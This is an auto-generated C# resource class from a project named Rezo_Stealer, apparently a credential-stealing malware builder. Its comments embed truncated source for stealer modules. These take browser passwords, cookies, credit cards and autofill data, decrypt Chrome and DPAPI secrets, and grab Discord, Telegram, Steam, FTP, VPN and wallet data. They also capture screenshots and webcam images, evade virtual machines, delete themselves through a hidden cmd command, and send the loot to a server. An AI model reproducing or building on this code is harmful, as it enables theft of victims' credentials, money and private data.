//------------------------------------------------------------------------------
// <auto-generated>
//     Этот код создан программой.
//     Исполняемая версия:4.0.30319.42000
//
//     Изменения в этом файле могут привести к неправильной работе и будут потеряны в случае
//     повторной генерации кода.
// </auto-generated>
//------------------------------------------------------------------------------

namespace Rezo_Stealer.Properties {
    using System;
    
    
    /// <summary>
    ///   Класс ресурса со строгой типизацией для поиска локализованных строк и т.д.
    /// </summary>
    // Этот класс создан автоматически классом StronglyTypedResourceBuilder
    // с помощью такого средства, как ResGen или Visual Studio.
    // Чтобы добавить или удалить член, измените файл .ResX и снова запустите ResGen
    // с параметром /str или перестройте свой проект VS.
    [global::System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "16.0.0.0")]
    [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
    [global::System.Runtime.CompilerServices.CompilerGeneratedAttribute()]
    internal class Resources {
        
        private static global::System.Resources.ResourceManager resourceMan;
        
        private static global::System.Globalization.CultureInfo resourceCulture;
        
        [global::System.Diagnostics.CodeAnalysis.SuppressMessageAttribute("Microsoft.Performance", "CA1811:AvoidUncalledPrivateCode")]
        internal Resources() {
        }
        
        /// <summary>
        ///   Возвращает кэшированный экземпляр ResourceManager, использованный этим классом.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Resources.ResourceManager ResourceManager {
            get {
                if (object.ReferenceEquals(resourceMan, null)) {
                    global::System.Resources.ResourceManager temp = new global::System.Resources.ResourceManager("Rezo_Stealer.Properties.Resources", typeof(Resources).Assembly);
                    resourceMan = temp;
                }
                return resourceMan;
            }
        }
        
        /// <summary>
        ///   Перезаписывает свойство CurrentUICulture текущего потока для всех
        ///   обращений к ресурсу с помощью этого класса ресурса со строгой типизацией.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Globalization.CultureInfo Culture {
            get {
                return resourceCulture;
            }
            set {
                resourceCulture = value;
            }
        }
        
        /// <summary>
        ///   Ищет локализованную строку, похожую на using System;
        ///using System.Collections.Generic;
        ///using System.IO;
        ///
        ///namespace Stealer.modules
        ///{
        ///  internal class Autofill
        ///  {
        ///    public static void GetCAutofills()
        ///    {
        ///      string str1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + &quot;\\&quot;;
        ///      string str2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + &quot;\\&quot;;
        ///      string str3 = &quot;\\User Data\\Default\\Web data&quot;;
        ///       string[] strArray1 = new string[34]
        ///            {
        ///        str2 + &quot;Go [остаток строки не уместился]&quot;;.
        /// </summary>
        internal static string Autofills {
            get {
                return ResourceManager.GetString("Autofills", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Ищет локализованную строку, похожую на using System;
        ///using System.Reflection;
        ///using System.Runtime.InteropServices;
        ///using System.Threading;
        ///
        ///namespace Stealer.modules
        ///{
        ///    internal class CheckPovt
        ///    {
        ///        public static void CheckPril()
        ///        {
        ///            if (Inizialize() == false)
        ///            {
        ///                Environment.Exit(0);
        ///            }
        ///        }
        ///
        ///        private static string GetGUID()
        ///        {
        ///            string result;
        ///            try
        ///            {
        ///                Assembly assembly = typeof(CheckPovt). [остаток строки не уместился]&quot;;.
        /// </summary>
        internal static string CheckPovt {
            get {
                return ResourceManager.GetString("CheckPovt", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Ищет локализованную строку, похожую на using System;
        ///using System.IO;
        ///using System.Runtime.InteropServices;
        ///
        ///namespace Stealer.modules
        ///{
        ///  internal class Clipboard
        ///  {
        ///    [DllImport(&quot;user32.dll&quot;)]
        ///    private static extern bool IsClipboardFormatAvailable(uint format);
        ///
        ///    [DllImport(&quot;user32.dll&quot;, SetLastError = true)]
        ///    private static extern bool OpenClipboard(IntPtr hWndNewOwner);
        ///
        ///    [DllImport(&quot;user32.dll&quot;)]
        ///    private static extern IntPtr GetClipboardData(uint uFormat);
        ///
        ///    [DllImport(&quot;kernel32.dll&quot;)]
        ///    private sta [остаток строки не уместился]&quot;;.
        /// </summary>
        internal static string Clipboard {
            get {
                return ResourceManager.GetString("Clipboard", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Ищет локализованную строку, похожую на using System;
        ///using System.Collections.Generic;
        ///using System.IO;
        ///
        ///namespace Stealer.modules
        ///{
        ///  internal class Cookies
        ///  {
        ///    public static void GetCookies()
        ///    {
        ///      string str1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + &quot;\\&quot;;
        ///      string str2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + &quot;\\&quot;;
        ///      string str3 = &quot;\\User Data\\Default\\Cookies&quot;;
        ///       string[] strArray1 = new string[34]
        ///            {
        ///        str2 + &quot;Google\ [остаток строки не уместился]&quot;;.
        /// </summary>
        internal static string Cookies {
            get {
                return ResourceManager.GetString("Cookies", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Ищет локализованную строку, похожую на using System;
        ///using System.Collections.Generic;
        ///using System.IO;
        ///
        ///namespace Stealer.modules
        ///{
        ///  internal class CreditCards
        ///  {
        ///    public static void GetCreditCards()
        ///    {
        ///      string str1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + &quot;\\&quot;;
        ///      string str2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + &quot;\\&quot;;
        ///      string str3 = &quot;\\User Data\\Default\\Web data&quot;;
        ///      string[] strArray1 = new string[34]
        ///            {
        ///        str2 +  [остаток строки не уместился]&quot;;.
        /// </summary>
        internal static string CreditCards {
            get {
                return ResourceManager.GetString("CreditCards", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Ищет локализованную строку, похожую на using System;
        ///using System.IO;
        ///using System.Text;
        ///using System.Text.RegularExpressions;
        ///
        ///namespace Stealer.modules
        ///{
        ///  internal class Crypt
        ///  {
        ///    public static string decryptChrome(string password, string browser = &quot;&quot;)
        ///    {
        ///      if (password.StartsWith(&quot;v10&quot;) || password.StartsWith(&quot;v11&quot;))
        ///      {
        ///        string path = &quot;&quot;;
        ///        string[] strArray1 = new string[3]
        ///        {
        ///          &quot;&quot;,
        ///          &quot;\\..&quot;,
        ///          &quot;\\..\\..&quot;
        ///        };
        ///        foreach (string str in strArray1)
        ///    [остаток строки не уместился]&quot;;.
        /// </summary>
        internal static string Crypt {
            get {
                return ResourceManager.GetString("Crypt", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Ищет локализованную строку, похожую на using System;
        ///using System.Collections.Generic;
        ///using System.Linq;
        ///using System.Runtime.InteropServices;
        ///using System.Text;
        ///
        ///namespace Stealer.modules
        ///{
        ///    public class DecryptAPI
        ///	{
        ///        public static byte[] DecryptBrowsers(byte[] cipherTextBytes, byte[] entropyBytes = null)
        ///        {
        ///            DataBlob pPlainText = new DataBlob();
        ///            DataBlob pCipherText = new DataBlob();
        ///            DataBlob pEntropy = new DataBlob();
        ///            CryptprotectPromptstruct pPrompt = new Cryptp [остаток строки не уместился]&quot;;.
        /// </summary>
        internal static string DecryptAPI {
            get {
                return ResourceManager.GetString("DecryptAPI", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Ищет локализованную строку, похожую на using System;
        ///using System.IO;
        ///
        ///namespace Stealer.modules
        ///{
        ///  internal class DesktopFiles
        ///  {
        ///    private static string DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        ///    private static string GrabberDir = Program.path + &quot;\\FilesDesktop\\&quot;;
        ///
        ///    private static long GetDirSize(string path, long size = 0)
        ///    {
        ///      try
        ///      {
        ///        foreach (string enumerateFile in Directory.EnumerateFiles(path))
        ///        {
        ///          try
        ///          {
        ///            size += new Fil [остаток строки не уместился]&quot;;.
        /// </summary>
        internal static string DesktopFiles {
            get {
                return ResourceManager.GetString("DesktopFiles", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Ищет локализованную строку, похожую на using System;
        ///using System.IO;
        ///
        ///namespace Stealer.modules
        ///{
        ///  internal class Discord
        ///  {
        ///    public static void GetDiscord()
        ///    {
        ///      string str1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + &quot;\\Discord\\Local Storage&quot;;
        ///      string str2 = Program.path + &quot;\\Discord&quot;;
        ///      try
        ///      {
        ///        if (!Directory.Exists(str1))
        ///          return;
        ///        if (!Directory.Exists(str2))
        ///          Directory.CreateDirectory(str2);
        ///        Telegram.CopyAll(str1, str2);
        ///      [остаток строки не уместился]&quot;;.
        /// </summary>
        internal static string Discord {
            get {
                return ResourceManager.GetString("Discord", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Ищет локализованную строку, похожую на using System;
        ///using System.IO;
        ///
        ///namespace Stealer.modules
        ///{
        ///    internal class FireFox
        ///    {
        ///        public static void GetPasswordFirefox()
        ///        {
        ///            string str8 = Program.path + &quot;\\&quot;;
        ///            string str1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + &quot;\\Mozilla\\Firefox\\Profiles\\&quot;;
        ///            string[] pathFireFox = Directory.GetFiles(str1, &quot;logins.json&quot;, SearchOption.AllDirectories);
        ///            if (pathFireFox != null)
        ///            {
        ///              [остаток строки не уместился]&quot;;.
        /// </summary>
        internal static string FireFox {
            get {
                return ResourceManager.GetString("FireFox", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Ищет локализованную строку, похожую на using System;
        ///using System.IO;
        ///using System.Text;
        ///using System.Xml;
        ///
        ///namespace Stealer.modules
        ///{
        ///  internal class FTPClient
        ///  {
        ///    public static void GetFTPClient()
        ///    {
        ///      FTPClient.GetFileZilla();
        ///	  TotalCommander();
        ///    }
        ///
        ///    public static void GetFileZilla()
        ///    {
        ///      string str1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + &quot;\\Filezilla\\recentservers.xml&quot;;
        ///      string str2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + &quot;\ [остаток строки не уместился]&quot;;.
        /// </summary>
        internal static string FTPClient {
            get {
                return ResourceManager.GetString("FTPClient", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Ищет локализованную строку, похожую на using Microsoft.Win32;
        ///using System;
        ///using System.Collections.Generic;
        ///using System.Diagnostics;
        ///using System.Drawing;
        ///using System.IO;
        ///using System.Management;
        ///using System.Windows.Forms;
        ///
        ///namespace Stealer.modules
        ///{
        ///  internal class HardwareInfo
        ///  {
        ///    public static void GoInfo()
        ///    {
        ///      string path = Program.path + &quot;\\HardwareInfo\\&quot;;
        ///      if (!File.Exists(path))
        ///        Directory.CreateDirectory(path);
        ///      using (StreamWriter streamWriter = new StreamWriter(path + &quot;SystemInfo.t [остаток строки не уместился]&quot;;.
        /// </summary>
        internal static string HardwareInfo {
            get {
                return ResourceManager.GetString("HardwareInfo", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Ищет локализованную строку, похожую на using System;
        ///using System.Management;
        ///using System.Runtime.InteropServices;
        ///using System.Net;
        ///using System.Xml;
        ///using System.IO;
        ///
        ///namespace Stealer.modules
        ///{
        ///    public class Help
        ///    {
        ///        public static string[] BrowsersName = new string[]
        ///        {
        ///                &quot;Chrome&quot;,
        ///                &quot;Edge&quot;,
        ///				&quot;Chromium&quot;,
        ///                &quot;Yandex&quot;,
        ///                &quot;Orbitum&quot;,
        ///				&quot;Atom&quot;,
        ///				&quot;Kometa&quot;,
        ///                &quot;Opera&quot;,
        ///				&quot;Brave-Browser&quot;,
        ///                &quot;Amigo&quot;,
        ///                &quot; [остаток строки не уместился]&quot;;.
        /// </summary>
        internal static string Help {
            get {
                return ResourceManager.GetString("Help", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Ищет локализованную строку, похожую на using System;
        ///using System.Collections.Generic;
        ///using System.IO;
        ///
        ///namespace Stealer.modules
        ///{
        ///  internal class History
        ///  {
        ///    public static void GetHistory()
        ///    {
        ///      string str1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + &quot;\\&quot;;
        ///      string str2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + &quot;\\&quot;;
        ///      string str3 = &quot;\\User Data\\Default\\History&quot;;
        ///      string[] strArray1 = new string[34]
        ///            {
        ///        str2 + &quot;Google\\ [остаток строки не уместился]&quot;;.
        /// </summary>
        internal static string History {
            get {
                return ResourceManager.GetString("History", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Ищет локализованную строку, похожую на using System;
        ///using System.IO;
        ///using System.Xml;
        ///
        ///namespace Stealer.modules
        ///{
        ///  internal class ImClient
        ///  {
        ///    public static void GetImClients()
        ///    {
        ///      ImClient.GetPsi();
        ///      ImClient.GetPidgin();
        ///      ImClient.GetPsiPlus();
        ///    }
        ///
        ///    private static void GetPsi()
        ///    {
        ///      string path = Program.path + &quot;\\IM&quot;;
        ///      string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + &quot;\\Psi\\profiles\\default\\accounts.xml&quot;;
        ///      if (!File.Exists(str))
        ///         [остаток строки не уместился]&quot;;.
        /// </summary>
        internal static string ImClient {
            get {
                return ResourceManager.GetString("ImClient", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Ищет локализованную строку, похожую на using System;
        ///using System.Collections.Generic;
        ///using System.Text;
        ///using System.Runtime.InteropServices;
        ///using System.Threading;
        ///using Microsoft.Win32;
        ///using System.Runtime.CompilerServices;
        ///using Microsoft.VisualBasic;
        ///using System.Net;
        ///using System.Diagnostics;
        ///using System.IO;
        ///
        ///namespace Stealer.modules
        ///{
        ///    public class Internet_Explorer
        ///    {
        ///        private const uint ALG_CLASS_DATA_ENCRYPT = 0x6000;
        ///        private const uint ALG_CLASS_HASH = 0x8000;
        ///        private const uint ALG_ [остаток строки не уместился]&quot;;.
        /// </summary>
        internal static string Internet_Explorer {
            get {
                return ResourceManager.GetString("Internet_Explorer", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Ищет локализованную строку, похожую на using System;
        ///using System.Net;
        ///using System.Xml;
        ///
        ///namespace Stealer.modules
        ///{
        ///    internal class Location
        ///    {
        ///        public static string GetLocation(bool Param)
        ///        {
        ///            try
        ///            {
        ///                string str1 = Program.path + &quot;\\&quot;;
        ///                string str2 = new WebClient().DownloadString(&quot;https://api.ipify.org/&quot;);
        ///                string address = &quot;http://ip-api.com/xml&quot;;
        ///                XmlDocument xmlDocument = new XmlDocument();
        ///                xmlDocument.Load [остаток строки не уместился]&quot;;.
        /// </summary>
        internal static string Location {
            get {
                return ResourceManager.GetString("Location", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Ищет локализованную строку, похожую на using Microsoft.Win32;
        ///using System;
        ///using System.IO;
        ///using System.Security.Cryptography;
        ///using System.Text;
        ///using System.Text.RegularExpressions;
        ///
        ///namespace Stealer.modules
        ///{
        ///  internal class MailClient
        ///  {
        ///    public static void GoMailClient()
        ///    {
        ///      MailClient.GrabOutlook();
        ///    }
        ///
        ///    private static void GrabOutlook()
        ///    {
        ///      string str1 = Program.path + &quot;\\&quot;;
        ///      string str2 = &quot;&quot;;
        ///      string str3 = &quot;\\Mail\\Outlook&quot;;
        ///      string[] strArray = new string[4]
        ///      {
        ///   [остаток строки не уместился]&quot;;.
        /// </summary>
        internal static string MailClient {
            get {
                return ResourceManager.GetString("MailClient", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Ищет локализованную строку, похожую на using System;
        ///using System.Collections.Generic;
        ///using System.IO;
        ///
        ///namespace Stealer.modules
        ///{
        ///  internal class Passwords
        ///  {
        ///    public static void GetPasswords()
        ///    {
        ///      string str1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + &quot;\\&quot;;
        ///      string str2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + &quot;\\&quot;;
        ///      string str3 = &quot;\\User Data\\Default\\Login Data&quot;;
        ///      string[] strArray1 = new string[34]
        ///            {
        ///        str2 + &quot;G [остаток строки не уместился]&quot;;.
        /// </summary>
        internal static string Passwords {
            get {
                return ResourceManager.GetString("Passwords", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Ищет локализованную строку, похожую на .
        /// </summary>
        internal static string Program {
            get {
                return ResourceManager.GetString("Program", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Ищет локализованную строку, похожую на using System;
        ///using System.Drawing;
        ///using System.Drawing.Imaging;
        ///using System.Windows.Forms;
        ///
        ///namespace Stealer.modules
        ///{
        ///  internal class ScreenDektop
        ///  {
        ///    public static void GetScreenshot(string filename = &quot;screenshot.jpg&quot;)
        ///    {
        ///      string str = Program.path;
        ///      Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
        ///      Graphics.FromImage((Image) bitmap).CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.Pr [остаток строки не уместился]&quot;;.
        /// </summary>
        internal static string ScreenDesktop {
            get {
                return ResourceManager.GetString("ScreenDesktop", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Ищет локализованную строку, похожую на using System;
        ///using System.Diagnostics;
        ///using System.Reflection;
        ///using System.IO;
        ///
        ///namespace Stealer.modules
        ///{
        ///	public class Delete
        ///	{
        ///		public static void SelfDelete()
        ///		{
        ///			try
        ///			{
        ///				Process.Start(new ProcessStartInfo()
        ///				{
        ///				Arguments = &quot;/C choice /C Y /N /D Y /T 3 &amp; Del \&quot;&quot; + new FileInfo(new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath).Name + &quot;\&quot;&quot;,
        ///				WindowStyle = ProcessWindowStyle.Hidden,
        ///				CreateNoWindow = true,
        ///				FileName = &quot;cmd.exe&quot;
        ///				}).Dispose();
        ///	 [остаток строки не уместился]&quot;;.
        /// </summary>
        internal static string SelfDelete {
            get {
                return ResourceManager.GetString("SelfDelete", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Ищет локализованную строку, похожую на using System;
        ///using System.Collections.Generic;
        ///using System.Diagnostics;
        ///using System.IO;
        ///using System.Net;
        ///using System.Net.Security;
        ///using System.Reflection;
        ///using System.Security.Cryptography.X509Certificates;
        ///using System.Threading;
        ///using System.Threading.Tasks;
        ///
        ///namespace Stealer.modules
        ///{
        ///    public static class SendToServer
        ///    {
        ///        private static readonly string path = Program.path;
        ///        private static readonly string pathToZip = Program.path + &quot;.zip&quot;;
        ///
        ///        public stat [остаток строки не уместился]&quot;;.
        /// </summary>
        internal static string SendToServer {
            get {
                return ResourceManager.GetString("SendToServer", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Ищет локализованную строку, похожую на using System;
        ///using System.IO;
        ///
        ///namespace Stealer.modules
        ///{
        ///  internal class Skype
        ///  {
        ///    public static void GetSkype()
        ///    {
        ///      string str1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + &quot;\\Microsoft\\Skype for Desktop\\Local Storage&quot;;
        ///      string str2 = Program.path + &quot;\\Skype\\&quot;;
        ///      try
        ///      {
        ///        if (!Directory.Exists(str1))
        ///          return;
        ///        if (!Directory.Exists(str2))
        ///          Directory.CreateDirectory(str2);
        ///        Telegram.CopyAll(st [остаток строки не уместился]&quot;;.
        /// </summary>
        internal static string Skype {
            get {
                return ResourceManager.GetString("Skype", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Ищет локализованную строку, похожую на using System;
        ///using System.IO;
        ///using System.Text;
        ///
        ///namespace Stealer.modules
        ///{
        ///  internal class cSQLite
        ///  {
        ///    private readonly byte[] _sqlDataTypeSize = new byte[10]
        ///    {
        ///      (byte) 0,
        ///      (byte) 1,
        ///      (byte) 2,
        ///      (byte) 3,
        ///      (byte) 4,
        ///      (byte) 6,
        ///      (byte) 8,
        ///      (byte) 8,
        ///      (byte) 0,
        ///      (byte) 0
        ///    };
        ///    private readonly ulong _dbEncoding;
        ///    private readonly byte[] _fileBytes;
        ///    private readonly ulong _pageSize;
        ///    private string[] _fieldNam [остаток строки не уместился]&quot;;.
        /// </summary>
        internal static string SQLite {
            get {
                return ResourceManager.GetString("SQLite", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Ищет локализованную строку, похожую на using Microsoft.Win32;
        ///using System;
        ///using System.Diagnostics;
        ///using System.IO;
        ///
        ///namespace Stealer.modules
        ///{
        ///  internal class Steam
        ///  {
        ///    public static void CopySteam()
        ///    {
        ///      string name = &quot;Name&quot;;
        ///      string locationSteam = Steam.GetLocationSteam();
        ///      string str = Program.path + &quot;\\Steam&quot;;
        ///      if (!Directory.Exists(locationSteam))
        ///        return;
        ///      Directory.CreateDirectory(str);
        ///      Steam.Closing(name);
        ///      try
        ///      {
        ///        foreach (string file in Directory.Ge [остаток строки не уместился]&quot;;.
        /// </summary>
        internal static string Steam {
            get {
                return ResourceManager.GetString("Steam", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Ищет локализованную строку, похожую на using System;
        ///using System.Diagnostics;
        ///using System.IO;
        ///
        ///namespace Stealer.modules
        ///{
        ///    public class Telegram
        ///    {
        ///        public static int count = 0;
        ///
        ///        private static bool in_patch = false;
        ///        public static void GetTelegram()
        ///        {
        ///            string str1 = Program.path;;
        ///            try
        ///            {
        ///                var prcName = &quot;Telegram&quot;;
        ///                Process[] processByName = Process.GetProcessesByName(prcName);
        ///
        ///                if (processByName.Length &lt; 1)
        /// [остаток строки не уместился]&quot;;.
        /// </summary>
        internal static string Telegram {
            get {
                return ResourceManager.GetString("Telegram", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Ищет локализованную строку, похожую на using System;
        ///using System.IO;
        ///
        ///namespace Stealer.modules
        ///{
        ///  internal class USB
        ///  {
        ///    private static string GrabberDir = Program.path + &quot;\\FilesUSB\\&quot;;
        ///
        ///    public static void GetUSB()
        ///    {
        ///      USB.Copy();
        ///    }
        ///
        ///    private static void Copy()
        ///    {
        ///      foreach (DriveInfo drive in DriveInfo.GetDrives())
        ///      {
        ///        if (drive.IsReady &amp;&amp; drive.DriveType == DriveType.Removable)
        ///        {
        ///          try
        ///          {
        ///            if (!Directory.Exists(USB.GrabberDir))
        ///             [остаток строки не уместился]&quot;;.
        /// </summary>
        internal static string USB {
            get {
                return ResourceManager.GetString("USB", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Ищет локализованную строку, похожую на using System;
        ///using System.Management;
        ///using System.Runtime.InteropServices;
        ///
        ///namespace Stealer.modules
        ///{
        ///    internal class VirtualMachine
        ///    {
        ///        public static void CheckVM()
        ///        {
        ///            if (DetectVM() == true)
        ///            {
        ///                Environment.Exit(0);
        ///            }
        ///        }
        ///        private static bool DetectVM()
        ///        {
        ///            try
        ///            {
        ///                using (var searcher = new ManagementObjectSearcher(&quot;Select * from Win32_ComputerSystem&quot;))
        ///    [остаток строки не уместился]&quot;;.
        /// </summary>
        internal static string VirtualMachine {
            get {
                return ResourceManager.GetString("VirtualMachine", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Ищет локализованную строку, похожую на using System;
        ///using System.IO;
        ///using System.Security.Cryptography;
        ///using System.Text;
        ///using System.Xml;
        ///
        ///namespace Stealer.modules
        ///{
        ///    internal class VPNClient
        ///    {
        ///        public static void GetVPN()
        ///        {
        ///            NordVPN();
        ///            ProtonVPN();
        ///        }
        ///
        ///        public static void NordVPN()
        ///        {
        ///			string str1 = Program.path;
        ///            string LocalData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        ///            string NordVPNDir = &quot;\\ [остаток строки не уместился]&quot;;.
        /// </summary>
        internal static string VPNClient {
            get {
                return ResourceManager.GetString("VPNClient", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Ищет локализованную строку, похожую на using Microsoft.Win32;
        ///using System;
        ///using System.IO;
        ///
        ///namespace Stealer.modules
        ///{
        ///  internal class Wallets
        ///  {
        ///    public static string pathToLogs = Program.path;
        ///    public static string AppDate = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        ///
        ///    public static void GetWallets()
        ///    {
        ///      Directory.CreateDirectory(Wallets.pathToLogs + &quot;\\Wallets&quot;);
        ///      Wallets.GetArmory();
        ///      Wallets.GetAtomicWallet();
        ///      Wallets.GetBitcoinCore();
        ///      Wallets.GetByteCoi [остаток строки не уместился]&quot;;.
        /// </summary>
        internal static string Wallets {
            get {
                return ResourceManager.GetString("Wallets", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Ищет локализованную строку, похожую на using System.Runtime.InteropServices;
        ///using System;
        ///
        ///namespace Stealer.modules
        ///{
        ///  internal class WebCam
        ///  {
        ///	[DllImport(&quot;avicap32.dll&quot;)]
        ///        public static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int X, int Y, int nWidth, int nHeight, int hwndParent, int nID);
        ///
        ///        [DllImport(&quot;user32&quot;)]
        ///        public static extern int SendMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);
        ///
        ///        internal static void GetWebCamPicture()
        ///        {
        ///			string pathT [остаток строки не уместился]&quot;;.
        /// </summary>
        internal static string WebCam {
            get {
                return ResourceManager.GetString("WebCam", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Ищет локализованную строку, похожую на using System;
        ///using System.Collections.Generic;
        ///using System.IO;
        ///using System.IO.Compression;
        ///using System.Text;
        ///
        ///namespace Stealer.modules
        ///{
        ///  public class ZipStore
        ///  {
        ///    public static void PackedZip(string pathFolder, string zipName)
        ///    {
        ///      ZipStore.ZipStorer zipStorer = ZipStore.ZipStorer.Create(zipName + &quot;.zip&quot;, &quot;&quot;);
        ///      zipStorer.EncodeUTF8 = true;
        ///      string str = pathFolder;
        ///      foreach (string file in Directory.GetFiles(str, &quot;*.*&quot;, SearchOption.AllDirectories))
        ///      {
        /// [остаток строки не уместился]&quot;;.
        /// </summary>
        internal static string ZipStore {
            get {
                return ResourceManager.GetString("ZipStore", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Поиск локализованного ресурса типа System.Drawing.Bitmap.
        /// </summary>
        internal static System.Drawing.Bitmap Безымянный {
            get {
                object obj = ResourceManager.GetObject("Безымянный", resourceCulture);
                return ((System.Drawing.Bitmap)(obj));
            }
        }
    }
}
